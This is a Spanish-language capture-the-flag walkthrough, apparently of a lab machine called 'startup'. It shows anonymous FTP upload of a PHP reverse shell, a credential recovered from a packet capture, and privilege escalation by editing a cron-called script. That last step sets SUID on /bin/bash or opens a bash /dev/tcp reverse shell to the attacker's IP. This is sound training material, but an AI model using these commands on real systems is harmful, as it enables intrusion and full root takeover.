
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

-Está habilitada la autenticación ftp con Anonymous

-Haciendo fuzzing encontramos la ruta /files que lista los archivos del servicio ftp.

-Nos logueamos en ftp con el usuario Anonymous, 
-Navegamos al directorio ftp, sobre el que tenemos todos los permisos
-Nos traemos una PHP reverse shell desde nuestra máquina.
-Ejecutamos el archivo subido desde la ruta /files en la web y obtenemos la conexión al servidor.

-Una vez dentro encontramos un directorio indicents con un archivo .pcapng.
.pcapng es un formato asociado principalmente a Wireshark utilizado para grabar en un archivo las trazas de paquetes de red capturados.

Antes de nada, tenemos que traernos el archivo de la máquina víctima a nuestra máquina, para ello:

-Iniciamos un servidor en la máquina víctima sirviendo el archivo: python3 -m http.server 8080
-Descargamos el archivo desde nuestra máquina: wget http://10.10.226.2:8080/suspicious.pcapng

-Si intentamos abrir el archivo, la mayoría de la información no se puede leer. Para ello, tenemos 2 opciones:

1-utilizamos el comando strings,  que extrae e imprime cadenas de texto legibles de un archivo binario.

strings suspicius.pcapng

2-Abrimos el archivo con Wireshark y analizamos el contenido

-Contraseña obtenida: c4ntg3t3n0ughsp1c3

-Buscamos en el directorio /home y en el /etc/passwd y vemos que hay otro usuario llamado lennie. Probamos a cambiar al usuario lennie con la contraseña obtenida:

www-data@startup:/incidents$ su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:/incidents$

## Escalada de privilegios

-Entramos al directorio scripts y vemos un archivo planner.sh con el siguiente contenido:

#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

Está guardando el contenido de la variable de entorno $LIST en el archivo startup_list.txt y después ejecuta el archivo print.sh.

Esto es una tarea CRON, que son tareas que se ejecutan de forma automática cada cierto tiempo. 

-No tenemos permiso de escritura en el archivo planner.sh, pero si en print.sh, eso nos interesa.
-Modificamos el archivo print.sh para obtener permisos de root, tenemos 2 opciones:

1. Le damos permisos SUID a la /bin/bash: chmod +s /bin/bash
	lennie@startup:/etc$ bash -p
	bash-4.3# whoami
	root

1. Nos mandamos una reverse shell a nuestra máquina: 
	bash -i >& /dev/tcp/10.9.1.219/1234 0>&1
	
	nc -lvnp 1234            
	listening on [any] 1234 ...
	connect to [10.9.1.219] from (UNKNOWN) [10.10.66.235] 42568
	bash: cannot set terminal process group (1747): Inappropriate ioctl for device
	bash: no job control in this shell
	root@startup:~# whoami
	whoami
	root


El archivo planner.sh se ejecuta cada cierto tiempo bajo permisos de root, este archivo ejecuta a su vez el archivo print.sh que es el que hemos modificado, por eso obtenemos la shell como root.





